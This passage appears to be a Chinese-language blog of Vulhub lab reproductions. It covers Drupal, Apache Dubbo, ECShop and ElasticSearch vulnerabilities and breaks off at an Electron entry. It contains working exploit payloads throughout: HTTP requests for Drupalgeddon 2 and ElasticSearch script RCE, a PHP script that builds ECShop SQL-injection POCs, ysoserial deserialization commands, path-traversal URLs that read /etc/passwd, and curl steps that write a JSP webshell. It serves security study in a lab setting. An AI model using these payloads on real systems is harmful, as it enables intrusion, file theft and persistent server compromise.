反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）</h1><blockquote><ul><li>影响软件：Drupal</li><li>方式：反序列化</li><li>参考链接：<a href="https://paper.seebug.org/334/">CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造</a></li><li>效果：任意代码执行</li></ul></blockquote><h2 id="漏洞复现-38"><a href="#漏洞复现-38" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>apt update网络超时…<br>先跳了</p><h1 id="Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）"><a href="#Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）" class="headerlink" title="Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）"></a>Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）</h1><blockquote><p>Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞。相关分析如下：</p><ul><li><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></li></ul></blockquote><h2 id="漏洞复现-39"><a href="#漏洞复现-39" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 参考<a href="https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py">a2u/CVE-2018-7600</a>，我们向安装完成的drupal发送如下数据包：</p><pre class="line-numbers language-none"><code class="language-none">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 103form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功执行代码，这个代码最终执行了id命令：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/85.jpg" alt="85"></p><h1 id="Drupal-远程代码执行漏洞（CVE-2018-7602）"><a href="#Drupal-远程代码执行漏洞（CVE-2018-7602）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2018-7602）"></a>Drupal 远程代码执行漏洞（CVE-2018-7602）</h1><blockquote><ul><li>影响软件：drupal</li><li>方式：对URL中的#进行编码两次，绕过sanitize()函数过滤</li><li>效果：任意命令执行</li></ul></blockquote><h2 id="漏洞复现-40"><a href="#漏洞复现-40" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>参考<a href="https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py">pimps/CVE-2018-7600</a>的PoC。</p><p>如下图所示，执行以下命令即可复现该漏洞。示例命令为 <code>id</code>，如图红框中显示，可以执行该命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># "id"为要执行的命令 第一个drupal为用户名 第二个drupal为密码python3 drupa7-CVE-2018-7602.py -c "id" drupal drupal http://127.0.0.1:8081/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/86.jpg" alt="86"></p><h1 id="Drupal-远程代码执行漏洞（CVE-2019-6339）"><a href="#Drupal-远程代码执行漏洞（CVE-2019-6339）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2019-6339）"></a>Drupal 远程代码执行漏洞（CVE-2019-6339）</h1><blockquote><ul><li>影响软件：Drupal</li><li>方式：phar反序列化RCE</li><li>参考链接：<a href="https://paper.seebug.org/897/">Drupal 1-click to RCE 分析</a></li><li>效果：任意命令执行</li></ul></blockquote><h2 id="漏洞复现-41"><a href="#漏洞复现-41" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>如下图所示，先使用管理员用户上传头像，头像图片为构造好的 PoC，参考<a href="https://github.com/thezdi/PoC/tree/master/Drupal">thezdi/PoC</a>的PoC。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/87.jpg" alt="87"></p><blockquote><p>Drupal 的图片默认存储位置为 <code>/sites/default/files/pictures/&lt;YYYY-MM&gt;/</code>，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。</p><p>访问 <code>http://127.0.0.1:8080/admin/config/media/file-system</code>，在 <code>Temporary directory</code> 处输入之前上传的图片路径，示例为 <code>phar://./sites/default/files/pictures/2019-06/blog-ZDI-CAN-7232-cat_0.jpg</code>，保存后将触发该漏洞。如下图所示，触发成功。</p></blockquote><p>如果不知道图片具体目录可以查看docker下的file目录或使用find命令<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/88.jpg" alt="88"></p><h1 id="Drupal-XSS漏洞（CVE-2019-6341）"><a href="#Drupal-XSS漏洞（CVE-2019-6341）" class="headerlink" title="Drupal XSS漏洞（CVE-2019-6341）"></a>Drupal XSS漏洞（CVE-2019-6341）</h1><blockquote><ul><li>影响软件：Drupal</li><li>方式：通过文件模块或者子系统上传恶意文件触发XSS漏洞</li><li>参考链接：<a href="https://paper.seebug.org/897/">Drupal 1-click to RCE 分析</a></li><li>效果：JS代码执行（Cookies 资料窃取、会话劫持、钓鱼欺骗、网页挂马等）</li></ul></blockquote><h2 id="漏洞复现-42"><a href="#漏洞复现-42" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>该漏洞需要利用drupal文件模块上传文件的漏洞，伪造一个图片文件，上传，文件的内容实际是一段HTML代码，内嵌JS，这样其他用户在访问这个链接时，就可能触发XSS漏洞。</p><p>Drupal 的图片默认存储位置为 <code>/sites/default/files/pictures/&lt;YYYY-MM&gt;/</code>，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。</p><p>使用PoC上传构造好的伪造GIF文件，PoC参考<a href="https://github.com/thezdi/PoC/tree/master/Drupal">thezdi/PoC</a>的PoC。</p><p>如图，输入如下命令，即可使用PoC构造样本并完成上传功能，第一个参数为目标IP 第二个参数为目标端口。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php cve-2019-6341-exp.php 192.168.11.1 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/90.jpg" alt="90"></p><blockquote><p>上传成功后，访问图片位置，即可触发 XSS 漏洞，如下图所示。</p><p>Tips:</p><ol><li>因为 Chrome 和 FireFox 浏览器自带部分过滤 XSS 功能，所以验证存在时可使用 Edge 浏览器或者 IE 浏览器。</li><li>访问的图片名称为_0的原因是因为 Drupal 的规则机制，具体原理见<a href="https://paper.seebug.org/897/">Drupal 1-click to RCE 分析</a></li></ol></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/89.jpg" alt="89"></p><h1 id="Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）"><a href="#Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）"></a>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</h1><blockquote><p>Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。Dubbo可以使用不同协议通信，当使用http协议时，Apache Dubbo直接使用了Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞。</p><p>在Spring文档中，对<code>HttpInvokerServiceExporter</code>有如下描述，并不建议使用：</p><blockquote><p>WARNING: Be aware of vulnerabilities due to unsafe Java deserialization: Manipulated input streams could lead to unwanted code execution on the server during the deserialization step. As a consequence, do not expose HTTP invoker endpoints to untrusted clients but rather just between your own services. In general, we strongly recommend any other message format (e.g. JSON) instead.</p></blockquote><p>这个漏洞影响Apache Dubbo 2.7.4及以前版本，2.7.5后Dubbo使用<code>com.googlecode.jsonrpc4j.JsonRpcServer</code>替换了<code>HttpInvokerServiceExporter</code>。</p><p>参考链接：</p><ul><li><a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html">https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html</a></li><li><a href="https://www.anquanke.com/post/id/198747">https://www.anquanke.com/post/id/198747</a></li><li><a href="https://paper.seebug.org/1128/">https://paper.seebug.org/1128/</a></li></ul></blockquote><h2 id="漏洞复现-43"><a href="#漏洞复现-43" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>利用该漏洞需要先知道目标RPC接口名，而Dubbo所有的RPC配置储存在registry中，通常使用Zookeeper作为registry。如果能刚好找到目标的Zookeeper未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p><p>Vulhub对外开放了8080端口和2181端口，其中2181即为Zookeeper的端口，我们本地下载<a href="https://zookeeper.apache.org/">Zookeeper</a>，使用其中自带的<strong>zkCli</strong>即可连接到这台Zookeeper服务器：</p><pre class="line-numbers language-none"><code class="language-none">./zkCli -server target-ip:2181<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接后进入一个交互式控制台，使用<code>ls</code>即可列出其中所有节点，包括Dubbo相关的配置：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/91.jpg" alt="91"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/92.jpg" alt="92"></p><blockquote><p>获取到RPC接口名为<code>org.vulhub.api.CalcService</code>。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到<code>http://your-ip:8080/org.vulhub.api.CalcService</code>即可触发反序列化漏洞：</p><pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial.jar CommonsCollections6 "touch /tmp/success" &gt; 1.poccurl -XPOST --data-binary @1.poc http://your-ip:8080/org.vulhub.api.CalcService<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>进入容器，可见<code>touch /tmp/success</code>已成功执行。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/94.jpg" alt="94"></p><h1 id="ECShop-2-x-3-x-SQL注入-任意代码执行漏洞"><a href="#ECShop-2-x-3-x-SQL注入-任意代码执行漏洞" class="headerlink" title="ECShop 2.x/3.x SQL注入/任意代码执行漏洞"></a>ECShop 2.x/3.x SQL注入/任意代码执行漏洞</h1><blockquote><p>ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。</p><p>其2017年及以前的版本中，存在一处SQL注入漏洞，通过该漏洞可注入恶意数据，最终导致任意代码执行漏洞。其3.6.0最新版已修复该漏洞，vulhub中使用其2.7.3最新版与3.6.0次新版进行漏洞复现。</p><p>参考链接：</p><ul><li><a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></li></ul></blockquote><h2 id="漏洞复现-44"><a href="#漏洞复现-44" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我编写了一个脚本，可以生成2.x和3.x的POC：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$shell = bin2hex("{\$asd'];phpinfo\t();//}xxx");$id = "-1' UNION/*";$arr = [    "num" =&gt; sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),    "id" =&gt; $id];$s = serialize($arr);$hash3 = '45ea207d7a2b68c49582d2d22adf953a';$hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';echo "POC for ECShop 2.x: \n";echo "{$hash2}ads|{$s}{$hash2}";echo "\n\nPOC for ECShop 3.x: \n";echo "{$hash3}ads|{$s}{$hash3}";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的POC，放在Referer里发送：</p><pre class="line-numbers language-none"><code class="language-none">GET /user.php?act=login HTTP/1.1Host: your-ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953aConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.x的执行结果</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/95.jpg" alt="95"></p><blockquote><p>3.x的执行结果：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/96.jpg" alt="96"></p><h1 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）测试环境"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）测试环境" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）测试环境"></a>ElasticSearch 命令执行漏洞（CVE-2014-3120）测试环境</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.1.1</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>相关文档：<a href="http://bouk.co/blog/elasticsearch-rce/">http://bouk.co/blog/elasticsearch-rce/</a> 、 <a href="https://www.t00ls.net/viewthread.php?tid=29408">https://www.t00ls.net/viewthread.php?tid=29408</a></p><p>老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。</p><p>MVEL执行命令的代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h2 id="漏洞复现-45"><a href="#漏洞复现-45" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>将Java代码放入json中：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">{    "size": 1,    "query": {      "filtered": {        "query": {          "match_all": {          }        }      }    },    "script_fields": {        "command": {            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"        }    }  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：</p><pre class="line-numbers language-none"><code class="language-none">POST /website/blog/ HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 25{  "name": "phithon"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/97.jpg" alt="97"></p><blockquote><p>然后，执行任意代码：</p><pre class="line-numbers language-none"><code class="language-none">POST /_search?pretty HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 343{    "size": 1,    "query": {      "filtered": {        "query": {          "match_all": {          }        }      }    },    "script_fields": {        "command": {            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如图：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/98.jpg" alt="98"></p><h1 id="ElasticSearch-Groovy-沙盒绕过-代码执行漏洞（CVE-2015-1427）测试环境"><a href="#ElasticSearch-Groovy-沙盒绕过-代码执行漏洞（CVE-2015-1427）测试环境" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）测试环境"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）测试环境</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.4.2</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>参考文章：</p><ul><li><a href="http://cb.drops.wiki/drops/papers-5107.html">http://cb.drops.wiki/drops/papers-5107.html</a></li><li><a href="http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/</a></li><li><a href="https://github.com/XiphosResearch/exploits">https://github.com/XiphosResearch/exploits</a></li><li><a href="http://cb.drops.wiki/drops/papers-5142.html">http://cb.drops.wiki/drops/papers-5142.html</a></li></ul><p>CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。</p><h2 id="Groovy语言“沙盒”"><a href="#Groovy语言“沙盒”" class="headerlink" title="Groovy语言“沙盒”"></a>Groovy语言“沙盒”</h2><p>ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法：</p><ol><li>既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射</li><li>Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言</li></ol><p>所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。</p><p>Java沙盒绕过法：</p><pre class="line-numbers language-none"><code class="language-none">java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("id").getText()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Goovy直接执行命令法：</p><pre class="line-numbers language-none"><code class="language-none">def command='id';def res=command.execute().text;res<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="漏洞复现-46"><a href="#漏洞复现-46" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</p><pre class="line-numbers language-none"><code class="language-none">POST /website/blog/ HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 25{  "name": "test"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/99.jpg" alt="99"></p><blockquote><p>然后发送包含payload的数据包，执行任意命令：</p><pre class="line-numbers language-none"><code class="language-none">POST /_search?pretty HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/textContent-Length: 156{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/100.jpg" alt="100"></p><h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-3337）测试环境"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-3337）测试环境" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-3337）测试环境"></a>ElasticSearch 目录穿越漏洞（CVE-2015-3337）测试环境</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.4.4</p><p>影响版本：1.4.5以下/1.5.2以下</p><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>在安装了具有“site”功能的插件以后，插件目录使用<code>../</code>即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。</p></blockquote><h2 id="漏洞复现-47"><a href="#漏洞复现-47" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>测试环境默认安装了一个插件：<code>elasticsearch-head</code>，主页在此：<a href="https://github.com/mobz/elasticsearch-head">https://github.com/mobz/elasticsearch-head</a></p><p>访问<code>http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd</code>读取任意文件（不要在浏览器访问）：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/101.jpg" alt="101"></p><h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-5531）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-5531）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-5531）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.6.0</p><p>影响版本：1.6.1以下</p><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>参考文章</p><ul><li><a href="https://www.exploit-db.com/exploits/38383/">https://www.exploit-db.com/exploits/38383/</a></li><li><a href="http://www.freebuf.com/vuls/99942.html">http://www.freebuf.com/vuls/99942.html</a></li></ul><p>说明：</p><p>elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在<code>path.repo</code>，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。</p></blockquote><h2 id="漏洞复现-48"><a href="#漏洞复现-48" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><h3 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h3><pre class="line-numbers language-none"><code class="language-none">PUT /_snapshot/test HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 108{    "type": "fs",    "settings": {        "location": "/usr/share/elasticsearch/repo/test"     }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/102.jpg" alt="102"></p><blockquote><h3 id="2-创建一个快照"><a href="#2-创建一个快照" class="headerlink" title="2. 创建一个快照"></a>2. 创建一个快照</h3><pre class="line-numbers language-none"><code class="language-none">PUT /_snapshot/test2 HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 108{    "type": "fs",    "settings": {        "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"     }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/103.jpg" alt="103"></p><blockquote><h3 id="3-目录穿越读取任意文件"><a href="#3-目录穿越读取任意文件" class="headerlink" title="3. 目录穿越读取任意文件"></a>3. 目录穿越读取任意文件</h3><p>访问 <code>http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code></p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/104.jpg" alt="104"></p><blockquote><p>如上图，在错误信息中包含文件内容（编码后），对其进行解码即可获得文件：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/105.jpg" alt="105"></p><h1 id="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"><a href="#Elasticsearch写入webshell漏洞（WooYun-2015-110216）" class="headerlink" title="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"></a>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</h1><blockquote><p>参考文章： <a href="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html</a></p><h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。</p><p>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。</p><p>和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项<code>path.repo</code>中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。</p></blockquote><h2 id="漏洞复现-49"><a href="#漏洞复现-49" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先创建一个恶意索引文档：</p><pre class="line-numbers language-none"><code class="language-none">curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d'{"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%&gt;":"test"}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再创建一个恶意的存储库，其中<code>location</code>的值即为我要写入的路径。</p><blockquote><p>园长：这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">curl -XPUT 'http://127.0.0.1:9200/_snapshot/yz.jsp' -d '{     "type": "fs",     "settings": {          "location": "/usr/local/tomcat/webapps/wwwroot/",          "compress": false     }}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存储库验证并创建:</p><pre class="line-numbers language-none"><code class="language-none">curl -XPUT "http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp" -d '{     "indices": "yz.jsp",     "ignore_unavailable": "true",     "include_global_state": false}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完成！</p><p>访问<code>http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp</code>，这就是我们写入的webshell。</p><p>该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：<code>http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</code>，我们再访问/wwwroot/test.jsp就能看到success了：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/106.jpg" alt="106"></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/107.jpg" alt="107"></p><h1 id="Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）（未完成）"><a href="#Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）（未完成）" class="headerlink" title="Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）（未完成）"></a>Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）（未完成）</h1><blockquote><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。</p><p>Electron在设置了<code>nodeIntegration=false</code>的情况下（默认），页面中的JavaScript无法访问node.js的内置库。CVE-2018-15685绕过了该限制，导致在用户可执行JavaScript的情况下（如访问第三方页面或APP存在XSS漏洞时），能够执行任意命令。</p><p>参考链接：</p><ul><li><a 